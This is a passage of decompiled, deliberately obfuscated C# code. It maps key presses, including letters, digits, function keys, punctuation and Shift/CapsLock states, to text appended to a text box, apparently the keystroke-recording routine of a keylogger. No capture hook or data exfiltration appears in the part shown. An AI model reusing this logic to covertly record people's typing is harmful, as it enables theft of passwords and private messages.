      this.TextBox1.Text += "<F10>";
      return;
label_515:
      flag2 = Key == Keys.F10;
      if (false)
        goto label_982;
      else
        goto label_513;
label_516:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        goto label_503;
      else
        goto label_474;
label_517:
      if (flag2)
      {
        this.TextBox1.Text += "<F9>";
        return;
      }
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
        goto label_515;
label_520:
      flag2 = Key == Keys.F9;
      goto label_517;
label_521:
      if (!flag2)
      {
        if (false)
          return;
        goto label_520;
      }
      else
      {
        this.TextBox1.Text += "<F8>";
        if (true)
          goto label_536;
        else
          goto label_526;
      }
label_524:
      flag2 = Key == Keys.F8;
      goto label_521;
label_526:
      while (!flag2)
      {
        if ((uint) flag2 + (uint) flag2 >= 0U)
          goto label_524;
      }
      this.TextBox1.Text += "<F7>";
      return;
label_529:
      if (true)
      {
        if ((uint) flag1 < 0U)
        {
          if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
            return;
        }
        else
          goto label_535;
      }
      else
        goto label_613;
label_532:
      if (!flag2)
      {
        flag2 = Key == Keys.F7;
        if (false)
          return;
        if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
          goto label_529;
      }
      else
        goto label_537;
label_535:
      if (true)
        goto label_526;
label_536:
      if (true)
        return;
      goto label_520;
label_537:
      this.TextBox1.Text += "<F6>";
      if (((flag2 ? 1 : 0) & 0) != 0)
        ;
      return;
label_539:
      if ((uint) flag1 < 0U)
      {
        if ((uint) flag1 >= 0U)
        {
          if ((uint) flag1 + (uint) flag1 >= 0U)
            goto label_546;
          else
            goto label_544;
        }
        else
          goto label_1509;
      }
      else
        goto label_532;
label_542:
      flag2 = Key == Keys.F6;
      if ((uint) flag2 - (uint) flag1 <= uint.MaxValue && ((uint) flag2 + (uint) flag1 < 0U || ((flag1 ? 1 : 0) & 0) != 0))
        return;
      if (true)
        goto label_539;
      else
        goto label_546;
label_544:
      if (Key == Keys.F5)
      {
        this.TextBox1.Text += "<F5>";
        return;
      }
      goto label_542;
label_546:
      if (true)
        goto label_549;
      else
        goto label_544;
label_547:
      if (true)
      {
        if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
          goto label_544;
      }
      else if (true)
      {
        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
        {
          if ((uint) flag1 + (uint) flag1 < 0U)
          {
            if (((flag1 ? 1 : 0) | 4) != 0)
              goto label_561;
            else
              goto label_559;
          }
          else
            goto label_544;
        }
        else
          goto label_1973;
      }
      else
        goto label_555;
label_549:
      if ((uint) flag1 - (uint) flag1 >= 0U)
        goto label_537;
      else
        goto label_563;
label_555:
      if (!flag2)
      {
        if ((uint) flag2 + (uint) flag2 >= 0U)
        {
          if (false)
            goto label_1574;
          else
            goto label_547;
        }
      }
      else
        goto label_558;
label_557:
      if (((flag2 ? 1 : 0) & 0) == 0)
        return;
      goto label_2020;
label_558:
      this.TextBox1.Text += "<F4>";
      goto label_557;
label_559:
      flag2 = Key == Keys.F4;
      if ((uint) flag2 - (uint) flag2 >= 0U)
        goto label_555;
      else
        goto label_558;
label_560:
      if (flag2)
        goto label_563;
      else
        goto label_559;
label_561:
      if (((flag1 ? 1 : 0) & 0) == 0)
      {
        if ((uint) flag1 - (uint) flag2 < 0U)
          ;
        return;
      }
      goto label_947;
label_563:
      this.TextBox1.Text += "<F3>";
      goto label_561;
label_564:
      flag2 = Key == Keys.F3;
      if (false)
        return;
      if (((flag1 ? 1 : 0) & 0) != 0)
      {
        if (true)
        {
          if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
          {
            if ((uint) flag1 + (uint) flag1 < 0U)
            {
              if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
                goto label_619;
              else
                goto label_609;
            }
            else
              goto label_563;
          }
          else
            goto label_593;
        }
        else
          goto label_572;
      }
      else
        goto label_560;
label_566:
      if (!flag2)
      {
        if ((uint) flag1 < 0U)
          goto label_1367;
        else
          goto label_564;
      }
      else
      {
        this.TextBox1.Text += "<F2>";
        return;
      }
label_571:
      if (!flag2)
      {
        flag2 = Key == Keys.F2;
        goto label_566;
      }
label_572:
      this.TextBox1.Text += "<F1>";
      if (((flag1 ? 1 : 0) | 4) != 0 || (uint) flag1 + (uint) flag1 > uint.MaxValue)
        return;
      if ((uint) flag1 <= uint.MaxValue)
        goto label_624;
      else
        goto label_622;
label_574:
      flag2 = Key == Keys.F1;
      if (((flag1 ? 1 : 0) | 15) != 0)
        goto label_571;
      else
        goto label_572;
label_576:
      flag2 = Key == Keys.Return;
label_577:
      if (flag2)
      {
        this.TextBox1.Text += "\r\n";
        if (true)
          return;
      }
      else
        goto label_574;
label_579:
      if (flag2)
      {
        this.TextBox1.Text += " ";
        return;
      }
      goto label_576;
label_581:
      flag2 = Key == Keys.Space;
      goto label_579;
label_593:
      while (Key != Keys.OemSemicolon)
      {
        flag2 = Key == Keys.OemPeriod;
        if (false)
          return;
        if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
        {
          if (true)
            goto label_586;
label_583:
          if (((flag2 ? 1 : 0) | 3) != 0)
            return;
          if ((uint) flag1 <= uint.MaxValue)
            goto label_1235;
          else
            goto label_1239;
label_586:
          if ((uint) flag2 - (uint) flag1 >= 0U)
          {
            if (!flag2)
            {
              flag2 = Key == Keys.Oemtilde;
              if (!flag2)
              {
                if (false)
                {
                  if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
                    goto label_26;
                  else
                    goto label_574;
                }
                else
                  goto label_581;
              }
              else
              {
                this.TextBox1.Text += "`";
                if (false)
                  return;
              }
            }
            else
            {
              this.TextBox1.Text += ".";
              if ((uint) flag1 - (uint) flag1 >= 0U)
                return;
            }
            if (((flag2 ? 1 : 0) & 0) == 0)
              goto label_583;
          }
          else
            goto label_237;
        }
      }
      this.TextBox1.Text += ";";
      return;
label_597:
      if (!flag2)
      {
        if (((flag2 ? 1 : 0) | -1) != 0)
          goto label_621;
      }
      else
        goto label_600;
label_599:
      if (true)
        return;
      goto label_1326;
label_600:
      this.TextBox1.Text += "\\";
      goto label_599;
label_601:
      if ((uint) flag1 - (uint) flag2 >= 0U)
      {
        if (((flag1 ? 1 : 0) & 0) == 0)
          goto label_597;
        else
          goto label_605;
      }
      else
        goto label_1479;
label_604:
      flag2 = Key == Keys.OemPipe;
      if (true)
        goto label_601;
label_605:
      if ((uint) flag1 >= 0U)
      {
        if (true)
          goto label_600;
        else
          goto label_621;
      }
      else
        goto label_609;
label_607:
      if (!flag2)
      {
        flag2 = Key == Keys.OemQuestion;
        if (!flag2)
        {
          if ((uint) flag2 > uint.MaxValue)
            goto label_489;
          else
            goto label_604;
        }
        else
        {
          this.TextBox1.Text += "/";
          return;
        }
      }
      else
      {
        this.TextBox1.Text += "]";
        if (false)
        {
          if ((uint) flag2 > uint.MaxValue)
            goto label_1527;
          else
            goto label_615;
        }
        else
        {
          if (true)
            return;
          if ((uint) flag1 <= uint.MaxValue)
            goto label_619;
          else
            goto label_618;
        }
      }
label_609:
      if ((uint) flag2 - (uint) flag2 < 0U)
        goto label_819;
      else
        goto label_607;
label_612:
      if (flag2)
        goto label_615;
label_613:
      flag2 = Key == Keys.OemCloseBrackets;
      if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
        goto label_640;
      else
        goto label_607;
label_615:
      this.TextBox1.Text += "[";
      return;
label_618:
      flag2 = Key == Keys.OemOpenBrackets;
      goto label_612;
label_619:
      if (true)
      {
        this.TextBox1.Text += "'";
        return;
      }
      goto label_805;
label_621:
      if ((uint) flag1 >= 0U)
        goto label_593;
      else
        goto label_563;
label_622:
      if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
      {
        if (true)
        {
          if (((flag2 ? 1 : 0) | 15) == 0 || true)
            goto label_619;
          else
            goto label_1579;
        }
        else
          goto label_628;
      }
      else
        goto label_661;
label_624:
      if (false)
        goto label_628;
label_625:
      flag2 = Key == Keys.OemQuotes;
label_626:
      if (flag2)
      {
        if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
          goto label_622;
      }
      else
        goto label_618;
label_628:
      if (flag2)
      {
        this.TextBox1.Text += "-";
        return;
      }
      goto label_625;
label_640:
      flag2 = Key == Keys.OemMinus;
      goto label_628;
label_643:
      if (false)
        goto label_1970;
label_644:
      if (!flag2)
      {
        flag2 = Key == Keys.Oemcomma;
        if (flag2)
        {
          this.TextBox1.Text += ",";
          if ((uint) flag1 + (uint) flag1 >= 0U)
            return;
          goto label_643;
        }
        else
          goto label_640;
      }
      else
      {
        this.TextBox1.Text += "z";
        if (((flag2 ? 1 : 0) | 15) == 0)
          return;
        if ((uint) flag2 >= 0U)
        {
          if (true)
            return;
          if ((uint) flag1 - (uint) flag1 >= 0U)
          {
            if (false)
            {
              if ((uint) flag2 - (uint) flag1 >= 0U)
              {
                if (((flag1 ? 1 : 0) | 2) != 0)
                {
                  if (false)
                    goto label_475;
                  else
                    goto label_256;
                }
                else
                  goto label_262;
              }
              else
                goto label_1127;
            }
            else
              goto label_789;
          }
          else
            goto label_793;
        }
      }
label_661:
      bool flag4;
      do
      {
        flag4 = Key == Keys.Y;
      }
      while ((uint) flag4 < 0U);
      if (!flag4)
      {
        flag2 = Key == Keys.Z;
        if (((flag2 ? 1 : 0) & 0) == 0)
        {
          if (true)
          {
            if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
              goto label_741;
            else
              goto label_644;
          }
          else
            goto label_233;
        }
        else
          goto label_197;
      }
      else if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag4 <= uint.MaxValue)
        {
          this.TextBox1.Text += "y";
          return;
        }
        goto label_750;
      }
      else
        goto label_833;
label_670:
      do
      {
        flag2 = Key == Keys.V;
        if (flag2)
          goto label_671;
      }
      while ((uint) flag2 - (uint) flag1 > uint.MaxValue);
      bool flag5 = Key == Keys.W;
      if ((uint) flag5 < 0U)
        return;
      if (!flag5)
      {
        do
        {
          flag2 = Key == Keys.X;
          if (flag2)
            this.TextBox1.Text += "x";
          else
            goto label_660;
        }
        while (false);
        goto label_666;
label_660:
        if (((flag1 ? 1 : 0) | 15) == 0)
          goto label_2162;
        else
          goto label_661;
label_666:
        if (true)
          return;
        goto label_688;
      }
      else
      {
        this.TextBox1.Text += "w";
        return;
      }
label_671:
      this.TextBox1.Text += "v";
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        return;
      goto label_423;
label_673:
      if (flag2)
        this.TextBox1.Text += "u";
      else
        goto label_670;
label_677:
      if ((uint) flag1 - (uint) flag1 >= 0U)
      {
        if (((flag2 ? 1 : 0) | int.MinValue) != 0)
        {
          if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
            goto label_673;
        }
        else
          goto label_1130;
      }
      else
        goto label_932;
label_679:
      if ((uint) flag1 >= 0U)
        ;
      return;
label_688:
      if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
        return;
      goto label_661;
label_695:
      do
      {
        flag2 = Key == Keys.R;
        if (true)
        {
          if (!flag2)
          {
            if (true)
            {
              if ((uint) flag1 + (uint) flag2 >= 0U)
              {
                if ((uint) flag1 <= uint.MaxValue)
                  flag2 = Key == Keys.S;
                if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
                {
                  if (((flag2 ? 1 : 0) & 0) == 0)
                    goto label_2045;
                }
                else
                  goto label_685;
              }
              else
                goto label_2054;
            }
            else
              goto label_955;
          }
          else
            goto label_694;
        }
        else
          goto label_46;
      }
      while (true);
      goto label_724;
label_685:
      if (false)
        return;
      if (!flag2)
      {
        flag2 = Key == Keys.T;
        if ((uint) flag2 >= 0U)
        {
          if (false)
          {
            if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
              goto label_146;
            else
              goto label_670;
          }
          else if (!flag2)
          {
            flag2 = Key == Keys.U;
            if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
              goto label_673;
            else
              goto label_679;
          }
          else
          {
            this.TextBox1.Text += "t";
            return;
          }
        }
        else
          goto label_879;
      }
      else
      {
        if ((uint) flag1 >= 0U)
        {
          this.TextBox1.Text += "s";
          return;
        }
        goto label_688;
      }
label_2054:
      return;
label_694:
      this.TextBox1.Text += "r";
      return;
label_2045:
      return;
label_700:
      this.TextBox1.Text += "q";
      return;
label_705:
      while (!flag2)
      {
        while ((uint) flag1 + (uint) flag1 <= uint.MaxValue && (uint) flag1 <= uint.MaxValue)
        {
          if ((uint) flag1 + (uint) flag2 >= 0U)
            goto label_701;
        }
        goto label_704;
label_701:
        bool flag6 = Key == Keys.Q;
        if ((uint) flag1 - (uint) flag6 <= uint.MaxValue && !flag6)
        {
          if (false)
            return;
          goto label_695;
        }
        else
          goto label_700;
label_704:
        if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
          goto label_701;
      }
      this.TextBox1.Text += "p";
      if ((uint) flag1 >= 0U)
        goto label_710;
label_709:
      flag2 = Key == Keys.P;
      if (true)
      {
        if ((uint) flag1 <= uint.MaxValue)
        {
          if (((flag2 ? 1 : 0) | 8) == 0)
            goto label_367;
          else
            goto label_705;
        }
        else
          goto label_1021;
      }
label_710:
      if (true)
        return;
label_711:
      if (!flag2)
      {
        if (false)
          return;
        goto label_709;
      }
label_715:
      this.TextBox1.Text += "o";
      if ((uint) flag1 <= uint.MaxValue)
        return;
      goto label_727;
label_719:
      while (!flag2)
      {
        flag2 = Key == Keys.O;
        if (((flag2 ? 1 : 0) | 8) != 0)
        {
          if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
            goto label_716;
label_713:
          if ((uint) flag1 < 0U)
            return;
          if ((uint) flag2 + (uint) flag1 < 0U)
            goto label_1669;
          else
            goto label_715;
label_716:
          if ((uint) flag1 - (uint) flag1 < 0U)
          {
            if ((uint) flag2 - (uint) flag1 < 0U)
            {
              if ((uint) flag2 > uint.MaxValue && ((flag2 ? 1 : 0) & 0) == 0)
                goto label_721;
            }
            else
              goto label_713;
          }
          else
            goto label_711;
        }
      }
      goto label_722;
label_721:
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        return;
      goto label_1970;
label_722:
      this.TextBox1.Text += "n";
      goto label_721;
label_724:
      if (!flag2)
      {
        flag2 = Key == Keys.N;
        goto label_719;
      }
      else
      {
        this.TextBox1.Text += "m";
        return;
      }
label_727:
      if (!flag2)
      {
        flag2 = Key == Keys.M;
        goto label_724;
      }
      else
      {
        this.TextBox1.Text += "l";
        return;
      }
label_736:
      flag2 = Key == Keys.K;
      if (!flag2)
      {
        flag2 = Key == Keys.L;
        if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
        {
          if ((uint) flag1 < 0U)
          {
            if (true)
            {
              if ((uint) flag2 - (uint) flag1 <= uint.MaxValue)
              {
                if ((uint) flag2 < 0U)
                  return;
                goto label_727;
              }
              else
                goto label_1048;
            }
            else
              goto label_350;
          }
          else
            goto label_727;
        }
        else
          goto label_1922;
      }
      else if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag2 <= uint.MaxValue)
        {
          this.TextBox1.Text += "k";
          return;
        }
        if ((uint) flag2 <= uint.MaxValue)
          goto label_793;
        else
          goto label_761;
      }
      else
        goto label_1844;
label_739:
      flag2 = Key == Keys.J;
label_740:
      if (!flag2)
        goto label_736;
label_741:
      if (true)
      {
        if (true)
          this.TextBox1.Text += "j";
        if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
          return;
        goto label_736;
      }
      else
        goto label_1800;
label_747:
      if (flag2)
      {
        this.TextBox1.Text += "i";
        return;
      }
      goto label_739;
label_750:
      flag2 = Key == Keys.H;
      if (flag2)
        goto label_751;
label_749:
      flag2 = Key == Keys.I;
      if (((flag1 ? 1 : 0) & 0) != 0)
        goto label_247;
      else
        goto label_747;
label_751:
      this.TextBox1.Text += "h";
      if ((uint) flag2 + (uint) flag1 >= 0U)
        return;
      if ((uint) flag2 > uint.MaxValue)
      {
        if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
          goto label_517;
        else
          goto label_739;
      }
      else
        goto label_749;
label_752:
      if (flag2)
      {
        this.TextBox1.Text += "g";
        return;
      }
      goto label_750;
label_757:
      this.TextBox1.Text += "f";
      return;
label_761:
      if (!flag2)
      {
        flag2 = Key == Keys.E;
        if (!flag2)
        {
          flag2 = Key == Keys.F;
          if (((flag2 ? 1 : 0) | -2) != 0)
          {
            if (!flag2)
            {
              flag2 = Key == Keys.G;
              goto label_752;
            }
            else
              goto label_757;
          }
        }
        if ((uint) flag1 >= 0U)
        {
          this.TextBox1.Text += "e";
          return;
        }
        goto label_1450;
      }
      else
        this.TextBox1.Text += "d";
label_763:
      if ((uint) flag2 >= 0U)
        return;
      if (((flag2 ? 1 : 0) & 0) != 0)
        goto label_392;
      else
        goto label_2124;
label_766:
      flag2 = Key == Keys.D;
      goto label_761;
label_769:
      if (!flag2)
      {
        if (Key == Keys.C)
        {
          this.TextBox1.Text += "c";
          return;
        }
        goto label_766;
      }
label_770:
      this.TextBox1.Text += "b";
      if (true)
        return;
      if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
      {
        if (true)
        {
          if (((flag2 ? 1 : 0) & 0) == 0)
          {
            if (((flag2 ? 1 : 0) & 0) != 0)
              return;
            goto label_766;
          }
          else
            goto label_761;
        }
        else
          goto label_781;
      }
      else
        goto label_779;
label_771:
      flag2 = Key == Keys.B;
      if ((uint) flag1 - (uint) flag1 < 0U)
      {
        if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        {
          if (false)
            return;
        }
        else
          goto label_770;
      }
      else
        goto label_769;
label_774:
      if (flag2)
      {
        this.TextBox1.Text += "a";
        return;
      }
      if ((uint) flag1 + (uint) flag2 >= 0U)
        goto label_771;
      else
        goto label_770;
label_779:
      flag2 = Key == Keys.A;
      goto label_774;
label_781:
      if (false)
        goto label_961;
label_782:
      this.TextBox1.Text += "0";
      return;
label_785:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag2 >= 0U)
        {
          bool flag7 = Key == Keys.D0;
          if ((uint) flag1 >= 0U)
          {
            if (flag7)
              goto label_782;
            else
              goto label_779;
          }
          else
            goto label_781;
        }
        else
          goto label_1808;
      }
label_788:
      this.TextBox1.Text += "9";
      return;
label_789:
      if (Key != Keys.D8)
      {
        flag2 = Key == Keys.D9;
        goto label_785;
      }
      else
      {
        this.TextBox1.Text += "8";
        return;
      }
label_793:
      if (!flag2)
      {
        if ((uint) flag1 + (uint) flag1 > uint.MaxValue)
          goto label_941;
        else
          goto label_789;
      }
label_795:
      this.TextBox1.Text += "7";
      return;
label_805:
      if (Key != Keys.D4)
      {
        bool flag8 = Key == Keys.D5;
        if (((flag8 ? 1 : 0) & 0) == 0)
          goto label_800;
        else
          goto label_806;
label_799:
        flag2 = Key == Keys.D6;
        if (!flag2)
        {
          if ((uint) flag1 + (uint) flag1 >= 0U)
          {
            flag2 = Key == Keys.D7;
            goto label_793;
          }
          else
            goto label_995;
        }
        else
        {
          this.TextBox1.Text += "6";
          return;
        }
label_800:
        if (flag8)
        {
          this.TextBox1.Text += "5";
          return;
        }
        goto label_799;
label_806:
        if (true)
          goto label_799;
      }
      else
      {
        this.TextBox1.Text += "4";
        return;
      }
label_807:
      this.TextBox1.Text += "3";
      return;
label_812:
      if (false)
        goto label_532;
label_813:
      bool flag9 = Key == Keys.D2;
      if (!flag9)
      {
        flag2 = Key == Keys.D3;
        if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
        {
          if (((flag2 ? 1 : 0) | 1) != 0)
          {
            if (true)
            {
              if (flag2)
                goto label_807;
              else
                goto label_805;
            }
            else if ((uint) flag2 - (uint) flag2 <= uint.MaxValue)
              goto label_807;
            else
              goto label_812;
          }
          else
            goto label_807;
        }
        else
          goto label_812;
      }
      else
      {
        this.TextBox1.Text += "2";
        if ((uint) flag9 + (uint) flag1 <= uint.MaxValue)
          return;
        goto label_1268;
      }
label_815:
      if (false)
        goto label_1642;
      else
        goto label_812;
label_816:
      this.TextBox1.Text += "1";
      return;
label_817:
      if (false)
        goto label_1643;
      else
        goto label_816;
label_819:
      flag2 = !MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock;
      if (flag2)
      {
        flag1 = Key == Keys.D1;
        if (!flag1)
        {
          if (((flag1 ? 1 : 0) & 0) == 0)
            goto label_815;
          else
            goto label_812;
        }
        else
          goto label_816;
      }
      else
        goto label_434;
label_821:
      if (true)
      {
        if (false)
          return;
        goto label_819;
      }
      else
        goto label_211;
label_822:
      if (flag2)
      {
        flag1 = Key == Keys.D1;
        if (!flag1)
        {
          if ((uint) flag2 + (uint) flag2 >= 0U)
          {
            if ((uint) flag1 - (uint) flag1 <= uint.MaxValue)
              goto label_1135;
          }
          else
            goto label_435;
        }
        else
          goto label_1141;
label_1139:
        if ((uint) flag2 >= 0U)
          return;
        goto label_1311;
label_1141:
        this.TextBox1.Text += "!";
        goto label_1139;
      }
      else
        goto label_819;
label_826:
      if (flag2)
        goto label_828;
label_827:
      if (Key != Keys.Multiply)
        return;
      this.TextBox1.Text += "*";
      return;
label_828:
      this.TextBox1.Text += "+";
      return;
label_833:
      flag2 = Key == Keys.Subtract;
label_834:
      if (flag2)
        goto label_839;
label_831:
      do
      {
        flag2 = Key == Keys.Add;
        if ((uint) flag1 - (uint) flag1 > uint.MaxValue)
        {
          if ((uint) flag2 <= uint.MaxValue)
            goto label_828;
        }
        else
          goto label_826;
      }
      while (false);
      if ((uint) flag2 - (uint) flag2 < 0U)
        return;
      goto label_826;
label_839:
      if (true)
      {
        this.TextBox1.Text += "-";
        return;
      }
      if (((flag2 ? 1 : 0) & 0) != 0)
      {
        if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
        {
          if ((uint) flag1 - (uint) flag2 >= 0U)
            goto label_864;
          else
            goto label_859;
        }
        else
          goto label_868;
      }
      else
        goto label_831;
label_842:
      this.TextBox1.Text += "/";
      if (((flag1 ? 1 : 0) & 0) == 0)
        return;
      goto label_1408;
label_843:
      if (flag2)
      {
        this.TextBox1.Text += "<ESC>";
        if ((uint) flag2 + (uint) flag1 >= 0U)
          goto label_848;
        else
          goto label_847;
      }
label_844:
      flag2 = Key == Keys.Divide;
label_845:
      if (!flag2)
      {
        flag2 = Key == Keys.Decimal;
        if (!flag2)
        {
          if (true)
          {
            if (true)
            {
              if ((uint) flag2 <= uint.MaxValue)
              {
                if (((flag2 ? 1 : 0) & 0) != 0)
                  return;
                goto label_833;
              }
              else
                goto label_719;
            }
            else
              goto label_915;
          }
          else
            goto label_833;
        }
        else
        {
          this.TextBox1.Text += ".";
          if ((uint) flag2 + (uint) flag1 <= uint.MaxValue)
            return;
          goto label_513;
        }
      }
      else
        goto label_842;
label_847:
      flag2 = Key == Keys.Escape;
      if ((uint) flag1 + (uint) flag2 <= uint.MaxValue)
        goto label_843;
label_848:
      if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
        return;
      goto label_842;
label_859:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
        return;
      goto label_1241;
label_862:
      do
      {
        flag2 = Key == Keys.Tab;
        do
        {
          if (!flag2)
          {
            flag2 = Key == Keys.End;
            if ((uint) flag1 > uint.MaxValue)
            {
              if (true)
                goto label_849;
            }
            else
              goto label_851;
          }
          else
            goto label_860;
        }
        while (false && (uint) flag1 >= 0U);
        goto label_1963;
label_860:
        this.TextBox1.Text += "<TAB>";
        if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
        {
          if (false)
            goto label_1829;
        }
        else
          goto label_859;
      }
      while ((uint) flag2 - (uint) flag2 <= uint.MaxValue);
      goto label_864;
label_849:
      if (flag2)
      {
        this.TextBox1.Text += "<END>";
        return;
      }
      goto label_847;
label_851:
      if (((flag1 ? 1 : 0) | 2) == 0)
        goto label_1109;
      else
        goto label_849;
label_1963:
      return;
label_864:
      if (flag2)
      {
        this.TextBox1.Text += "?";
        if ((uint) flag2 + (uint) flag2 >= 0U)
        {
          if (true)
            return;
          goto label_506;
        }
      }
      else
        goto label_862;
label_867:
      if (flag2)
      {
        this.TextBox1.Text += "?";
        return;
      }
label_868:
      flag2 = Key == Keys.Right;
      goto label_864;
label_872:
      if (!flag2)
      {
        flag2 = Key == Keys.Left;
        goto label_867;
      }
      else
      {
        this.TextBox1.Text += "?";
        return;
      }
label_877:
      while (Key != Keys.Down)
      {
        flag2 = Key == Keys.Up;
        if ((uint) flag2 >= 0U)
          goto label_872;
      }
      this.TextBox1.Text += "?";
      return;
label_878:
      this.TextBox1.Text += "<DEL>";
      return;
label_879:
      flag2 = Key == Keys.Back;
label_880:
      if (true)
      {
        if (!flag2)
        {
          if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
            goto label_597;
          else
            goto label_877;
        }
        else
          goto label_878;
      }
      else if (false)
        goto label_992;
      else
        goto label_1574;
label_884:
      flag2 = Key == Keys.Delete;
      if (true)
      {
        if (flag2)
        {
          this.TextBox1.Text += "<DEL>";
          if (true)
          {
            if ((uint) flag2 - (uint) flag2 >= 0U)
              return;
            goto label_878;
          }
          else
            goto label_1489;
        }
        else
          goto label_879;
      }
      else
        goto label_367;
label_886:
      this.TextBox1.Text += "<F12>";
      return;
label_899:
      this.TextBox1.Text += "<F9>";
      return;
label_911:
      flag2 = Key == Keys.F7;
label_912:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if (!flag2)
        {
          if (((flag2 ? 1 : 0) | 15) != 0)
            goto label_907;
label_902:
          flag2 = Key == Keys.F8;
          if (!flag2)
            flag2 = Key == Keys.F9;
          else if (true)
          {
            this.TextBox1.Text += "<F8>";
            if ((uint) flag2 >= 0U)
              return;
          }
          if ((uint) flag2 - (uint) flag2 <= uint.MaxValue && (uint) flag2 - (uint) flag2 > uint.MaxValue)
            return;
          if (((flag2 ? 1 : 0) & 0) == 0 && !flag2)
          {
label_894:
            bool flag10 = Key == Keys.F10;
            while (!flag10)
            {
              flag10 = Key == Keys.F11;
              if (!flag10)
              {
                flag2 = Key == Keys.F12;
                if (false)
                  return;
                if ((uint) flag2 - (uint) flag1 > uint.MaxValue)
                {
                  if (((flag2 ? 1 : 0) | -2) != 0)
                    goto label_894;
                  else
                    break;
                }
                else if ((uint) flag1 >= 0U)
                {
                  if (!flag2)
                    goto label_884;
                  else
                    goto label_886;
                }
                else if (false)
                {
                  if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
                    goto label_917;
                  else
                    goto label_898;
                }
                else if ((uint) flag2 - (uint) flag2 >= 0U)
                {
                  if (true)
                    goto label_877;
                  else
                    goto label_934;
                }
                else
                  goto label_923;
              }
              else
              {
                this.TextBox1.Text += "<F11>";
                if ((uint) flag10 >= 0U)
                  return;
              }
            }
            this.TextBox1.Text += "<F10>";
            if (((flag1 ? 1 : 0) & 0) == 0)
              return;
            goto label_944;
          }
          else
            goto label_906;
label_898:
          if ((uint) flag2 + (uint) flag2 > uint.MaxValue)
            return;
          goto label_899;
label_906:
          if ((uint) flag1 - (uint) flag2 >= 0U)
            goto label_898;
          else
            goto label_917;
label_907:
          if (((flag2 ? 1 : 0) & 0) == 0)
          {
            if (false)
              goto label_43;
            else
              goto label_902;
          }
          else
            goto label_785;
        }
      }
      else
        goto label_913;
label_910:
      this.TextBox1.Text += "<F7>";
      return;
label_913:
      if ((uint) flag1 + (uint) flag1 <= uint.MaxValue)
      {
        if ((uint) flag2 + (uint) flag1 >= 0U)
          goto label_910;
      }
      else
        goto label_1387;
label_915:
      if (true)
      {
        this.TextBox1.Text += "<F6>";
        return;
      }
      if (true)
      {
        if (((flag1 ? 1 : 0) | (int) byte.MaxValue) != 0)
        {
          if (((flag2 ? 1 : 0) & 0) == 0)
            goto label_1910;
          else
            goto label_1912;
        }
        else
          goto label_921;
      }
      else
        goto label_566;
label_917:
      if (!flag2)
        goto label_911;
      else
        goto label_915;
label_921:
      flag2 = Key == Keys.F6;
      if ((uint) flag1 + (uint) flag2 > uint.MaxValue)
        goto label_705;
      else
        goto label_917;
label_923:
      if ((uint) flag2 + (uint) flag2 < 0U)
        return;
      goto label_921;
label_932:
      if (Key != Keys.F4)
      {
        do
        {
          flag2 = Key == Keys.F5;
          if (flag2)
          {
            this.TextBox1.Text += "<F5>";
            if ((uint) flag2 + (uint) flag2 <= uint.MaxValue)
            {
              if (true)
              {
                if (((flag2 ? 1 : 0) | 15) == 0)
                {
                  if (true)
                    goto label_934;
                }
                else
                  goto label_1932;
              }
              else
                goto label_917;
            }
            else
              goto label_4;
          }
          else
            goto label_922;
        }
        while ((uint) flag2 >= 0U);
        goto label_224;
label_922:
        if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
        {
          if (false)
            goto label_1785;
          else
            goto label_921;
        }
        else
          goto label_2109;
label_1932:
        return;
      }
      this.TextBox1.Text += "<F4>";
      return;
label_934:
      if ((uint) flag2 + (uint) flag1 > uint.MaxValue)
        goto label_1834;
      else
        goto label_932;
label_941:
      this.TextBox1.Text += "<F1>";
      return;
label_944:
      this.TextBox1.Text += "\r\n";
      return;
label_947:
      this.TextBox1.Text += " ";
      if ((uint) flag2 + (uint) flag1 >= 0U)
        return;
label_949:
      this.TextBox1.Text += "~";
      return;
label_952:
      bool flag11 = Key == Keys.Oemtilde;
      if (!flag11)
      {
        flag2 = Key == Keys.Space;
        if (!flag2)
        {
          flag2 = Key == Keys.Return;
          if (!flag2)
          {
            if ((uint) flag2 <= uint.MaxValue)
            {
              if (Key != Keys.F1)
              {
                while (Key != Keys.F2)
                {
                  flag2 = Key == Keys.F3;
                  if (flag2)
                  {
                    this.TextBox1.Text += "<F3>";
                    return;
                  }
                  if ((uint) flag2 <= uint.MaxValue)
                  {
                    if ((uint) flag1 - (uint) flag2 <= uint.MaxValue)
                    {
